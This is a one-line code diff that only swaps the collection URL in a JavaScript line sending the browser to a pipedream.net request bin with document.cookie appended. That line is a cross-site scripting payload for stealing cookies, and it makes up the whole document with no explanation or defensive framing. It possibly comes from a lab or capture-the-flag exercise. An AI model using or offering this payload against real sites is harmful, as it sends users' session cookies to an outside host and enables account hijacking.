@@ -1,1 +1,1 @@
-location.href="https://ensqq1mo8a7fk.x.pipedream.net/"+document.cookie
+location.href="https://enuzpu0z40dr.x.pipedream.net/"+document.cookie
